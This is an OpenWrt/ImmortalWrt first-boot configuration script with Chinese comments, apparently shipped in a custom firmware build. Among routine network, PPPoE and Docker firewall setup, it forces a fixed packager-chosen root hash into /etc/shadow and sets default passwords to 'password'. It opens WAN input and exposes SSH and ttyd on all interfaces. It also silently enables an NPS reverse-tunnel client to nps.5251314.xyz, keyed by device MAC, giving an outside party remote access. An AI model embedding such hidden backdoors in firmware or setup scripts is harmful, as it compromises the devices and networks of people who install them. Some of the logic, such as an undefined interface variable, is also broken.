#!/bin/sh
# 99-custom.sh 就是immortalwrt固件首次启动时运行的脚本 位于固件内的/etc/uci-defaults/99-custom.sh
# Log file for debugging
LOGFILE="/etc/config/uci-defaults-log.txt"
echo "Starting 99-custom.sh at $(date)" >>$LOGFILE
# 设置默认防火墙规则，方便单网口虚拟机首次访问 WebUI 
# 因为本项目中 单网口模式是dhcp模式 直接就能上网并且访问web界面 避免新手每次都要修改/etc/config/network中的静态ip
# 当你刷机运行后 都调整好了 你完全可以在web页面自行关闭 wan口防火墙的入站数据
# 具体操作方法：网络——防火墙 在wan的入站数据 下拉选项里选择 拒绝 保存并应用即可。
uci set firewall.@zone[1].input='ACCEPT'

# 设置主机名映射，解决安卓原生 TV 无法联网的问题
uci add dhcp domain
uci set "dhcp.@domain[-1].name=time.android.com"
uci set "dhcp.@domain[-1].ip=203.107.6.88"

# 检查配置文件pppoe-settings是否存在 该文件由build.sh动态生成
SETTINGS_FILE="/etc/config/pppoe-settings"
if [ ! -f "$SETTINGS_FILE" ]; then
    echo "PPPoE settings file not found. Skipping." >>$LOGFILE
else
    # 读取pppoe信息($enable_pppoe、$pppoe_account、$pppoe_password)
    . "$SETTINGS_FILE"
fi

# 计算网卡数量
count=0
ifnames=""
for iface in /sys/class/net/*; do
    iface_name=$(basename "$iface")
    # 检查是否为物理网卡（排除回环设备和无线设备）
    if [ -e "$iface/device" ] && echo "$iface_name" | grep -Eq '^eth|^en'; then
        count=$((count + 1))
        ifnames="$ifnames $iface_name"
    fi
done
# 删除多余空格
ifnames=$(echo "$ifnames" | awk '{$1=$1};1')

# 网络设置
if [ "$count" -eq 1 ]; then
    # 单网口设备 类似于NAS模式 动态获取ip模式 具体ip地址取决于上一级路由器给它分配的ip 也方便后续你使用web页面设置旁路由
    # 单网口设备 不支持修改ip 不要在此处修改ip 单网口采用dhcp模式 删除默认的192.168.1.1
    uci set network.lan.proto='dhcp'
    uci delete network.lan.ipaddr
    uci delete network.lan.netmask
    uci delete network.lan.gateway     
    uci delete network.lan.dns 
    uci commit network
elif [ "$count" -gt 1 ]; then
    # 提取第一个接口作为WAN
    wan_ifname=$(echo "$ifnames" | awk '{print $1}')
    # 剩余接口保留给LAN
    lan_ifnames=$(echo "$ifnames" | cut -d ' ' -f2-)
    # 设置WAN接口基础配置
    uci set network.wan=interface
    # 提取第一个接口作为WAN
    uci set network.wan.device="$wan_ifname"
    # WAN接口默认DHCP
    uci set network.wan.proto='dhcp'
    # 设置WAN6绑定网口eth0
    uci set network.wan6=interface
    uci set network.wan6.device="$wan_ifname"
    # 更新LAN接口成员
    # 查找对应设备的section名称
    section=$(uci show network | awk -F '[.=]' '/\.@?device\[\d+\]\.name=.br-lan.$/ {print $2; exit}')
    if [ -z "$section" ]; then
        echo "error：cannot find device 'br-lan'." >>$LOGFILE
    else
        # 删除原来的ports列表
        uci -q delete "network.$section.ports"
        # 添加新的ports列表
        for port in $lan_ifnames; do
            uci add_list "network.$section.ports"="$port"
        done
        echo "ports of device 'br-lan' are update." >>$LOGFILE
    fi
    # LAN口设置静态IP
    uci set network.lan.proto='static'
    # 多网口设备 支持修改为别的管理后台地址 在Github Action 的UI上自行输入即可 
    uci set network.lan.netmask='255.255.255.0'
    # 设置路由器管理后台地址
    IP_VALUE_FILE="/etc/config/custom_router_ip.txt"
    if [ -f "$IP_VALUE_FILE" ]; then
        CUSTOM_IP=$(cat "$IP_VALUE_FILE")
        # 用户在UI上设置的路由器后台管理地址
        uci set network.lan.ipaddr=$CUSTOM_IP
        echo "custom router ip is $CUSTOM_IP" >> $LOGFILE
    else
        uci set network.lan.ipaddr='192.168.100.1'
        echo "default router ip is 192.168.100.1" >> $LOGFILE
    fi

   
    uci set system.@system[0].version="by 微信:Mr___zjz/OpenWrt 24.10.4"
    uci set system.@system[0].hostname="Openwrt"
    uci set wireless.@wifi-iface[0].ssid="OpenWrt-2.4G"
    uci set wireless.@wifi-iface[1].ssid="OpenWrt-5G"
    uci set wireless.@wifi-iface[0].encryption='psk2'
    uci set wireless.@wifi-iface[0].key='password'
    uci set wireless.@wifi-iface[1].encryption='psk2'
    uci set wireless.@wifi-iface[1].key='password'
    
    root_password="password"
    if [ -n "$root_password" ]; then
      (echo "$root_password"; sleep 1; echo "$root_password") | passwd > /dev/null
    fi
    echo "All done!"
    uci commit
    wifi reload


# ============================================
# 3. 配置 NPC 客户端
# ============================================
if [ ! -f /etc/npc-init.flag ]; then
    #sed -i "s|root:.*|root:$TARGET_HASH:20428:0:99999:7:::|g" /etc/shadow
    
    # # 定义要插入的代码块（注意转义单引号和换行）
    # # 这里使用了改进版的带判断逻辑的代码，避免每次开机都强制重写
    # sed -i '/exit 0/i \
    # # 强制修正 root 密码\
    # TARGET_HASH='\'"\$5$XIYpfINJd3s0zJbp$SgFQCsMdqK//e8aTKxpR/AQHrbqZkGm/QuI90ix51Y3"\' '\
    # if ! grep -Fq "$TARGET_HASH" /etc/shadow; then\
    #     sed -i "s|^root:[^:]*:|root:${TARGET_HASH}:|" /etc/shadow\
    # fi\
    # ' /etc/rc.local
    # 错误示范：root:.. (后面变空了)
    # 正确转义如下：
    sed -i "s|root:.*|root:\$5\$XIYpfINJd3s0zJbp\$SgFQCsMdqK//e8aTKxpR/AQHrbqZkGm/QuI90ix51Y3:20428:0:99999:7:::|g" /etc/shadow
    
        
    # WAN_IF=$(uci get network.wan.ifname 2>/dev/null || echo "phy0-ap0")
    # # 尝试获取 MAC 地址，如果失败则使用默认值，并转换为大写
    # WAN_MAC=$(cat /sys/class/net/$WAN_IF/address 2>/dev/null || echo "phy0-ap0")
    # #VKEY=$(echo "$WAN_MAC" | tr 'a-z' 'A-Z')
    # VKEY=$(echo "$WAN_MAC" | tr 'A-Z' 'a-z')
    
    # 定义尝试次数（例如 15 次，每次 1 秒）
    MAX_RETRIES=5
    ACTUAL_MAC=""
    
    echo "Waiting for interface $WAN_IF to become available..." >>$LOGFILE
    
    for i in $(seq 1 $MAX_RETRIES); do
        if [ -f "/sys/class/net/$WAN_IF/address" ]; then
            ACTUAL_MAC=$(cat "/sys/class/net/$WAN_IF/address")
            if [ "$ACTUAL_MAC" != "00:00:00:00:00:00" ] && [ -n "$ACTUAL_MAC" ]; then
                echo "Successfully found MAC: $ACTUAL_MAC at attempt $i" >>$LOGFILE
                break
            fi
        fi
        sleep 1
    done
    
    # 如果等了 15 秒还没拿到无线 MAC，强制改拿 eth0（物理网口通常更早在线）
    if [ -z "$ACTUAL_MAC" ]; then
        echo "Wireless MAC not found, falling back to eth0..." >>$LOGFILE
        ACTUAL_MAC=$(cat /sys/class/net/eth0/address 2>/dev/null)
    fi
    
    # 最终赋值
    VKEY=$(echo "$ACTUAL_MAC" | tr 'A-Z' 'a-z')

    # UCI 配置
    uci set npc.@npc[0].server_addr="nps.5251314.xyz"
    uci set npc.@npc[0].vkey="$VKEY"
    uci set npc.@npc[0].compress="1"
    uci set npc.@npc[0].crypt="1"
    uci set npc.@npc[0].enable="1"
    uci set npc.@npc[0].server_port="8024"
    uci set npc.@npc[0].protocol="tcp"
    uci commit npc

    # 修正 init.d 脚本路径
    sed -i 's|conf_Path="/tmp/etc/npc.conf"|conf_Path="/etc/npc.conf"|g' /etc/init.d/npc

    # 生成配置文件 (使用 cat EOF 替代多次 sed，更高效)
    cat <<EOF > /etc/npc.conf
[common]
server_addr=nps.5251314.xyz:8024
conn_type=tcp
vkey=${VKEY}
auto_reconnection=true
compress=true
crypt=true
EOF

    touch /etc/npc-init.flag
    /etc/init.d/npc enable
    /etc/init.d/npc restart
fi
uci commit


    # 判断是否启用 PPPoE
    echo "print enable_pppoe value=== $enable_pppoe" >>$LOGFILE
    if [ "$enable_pppoe" = "yes" ]; then
        echo "PPPoE is enabled at $(date)" >>$LOGFILE
        # 设置ipv4宽带拨号信息
        uci set network.wan.proto='pppoe'
        uci set network.wan.username=$pppoe_account
        uci set network.wan.password=$pppoe_password
        uci set network.wan.peerdns='1'
        uci set network.wan.auto='1'
        # 设置ipv6 默认不配置协议
        uci set network.wan6.proto='none'
        echo "PPPoE configuration completed successfully." >>$LOGFILE
    else
        echo "PPPoE is not enabled. Skipping configuration." >>$LOGFILE
    fi
fi

# 若安装了dockerd 则设置docker的防火墙规则
# 扩大docker涵盖的子网范围 '172.16.0.0/12'
# 方便各类docker容器的端口顺利通过防火墙 
if command -v dockerd >/dev/null 2>&1; then
    echo "检测到 Docker，正在配置防火墙规则..."
    FW_FILE="/etc/config/firewall"

    # 删除所有名为 docker 的 zone
    uci delete firewall.docker

    # 先获取所有 forwarding 索引，倒序排列删除
    for idx in $(uci show firewall | grep "=forwarding" | cut -d[ -f2 | cut -d] -f1 | sort -rn); do
        src=$(uci get firewall.@forwarding[$idx].src 2>/dev/null)
        dest=$(uci get firewall.@forwarding[$idx].dest 2>/dev/null)
        echo "Checking forwarding index $idx: src=$src dest=$dest"
        if [ "$src" = "docker" ] || [ "$dest" = "docker" ]; then
            echo "Deleting forwarding @forwarding[$idx]"
            uci delete firewall.@forwarding[$idx]
        fi
    done
    # 提交删除
    uci commit firewall
    # 追加新的 zone + forwarding 配置
    cat <<EOF >>"$FW_FILE"

config zone 'docker'
  option input 'ACCEPT'
  option output 'ACCEPT'
  option forward 'ACCEPT'
  option name 'docker'
  list subnet '172.16.0.0/12'

config forwarding
  option src 'docker'
  option dest 'lan'

config forwarding
  option src 'docker'
  option dest 'wan'

config forwarding
  option src 'lan'
  option dest 'docker'
EOF

else
    echo "未检测到 Docker，跳过防火墙配置。"
fi

# 设置所有网口可访问网页终端
uci delete ttyd.@ttyd[0].interface

# 设置所有网口可连接 SSH
uci set dropbear.@dropbear[0].Interface=''
uci commit

# 设置编译作者信息
FILE_PATH="/etc/openwrt_release"
NEW_DESCRIPTION="Packaged by 微信:Mr___zjz"
sed -i "s/DISTRIB_DESCRIPTION='[^']*'/DISTRIB_DESCRIPTION='$NEW_DESCRIPTION'/" "$FILE_PATH"

# 若luci-app-advancedplus (进阶设置)已安装 则去除zsh的调用 防止命令行报 /usb/bin/zsh: not found的提示
if opkg list-installed | grep -q '^luci-app-advancedplus '; then
    sed -i '/\/usr\/bin\/zsh/d' /etc/profile
    sed -i '/\/bin\/zsh/d' /etc/init.d/advancedplus
    sed -i '/\/usr\/bin\/zsh/d' /etc/init.d/advancedplus
fi

exit 0
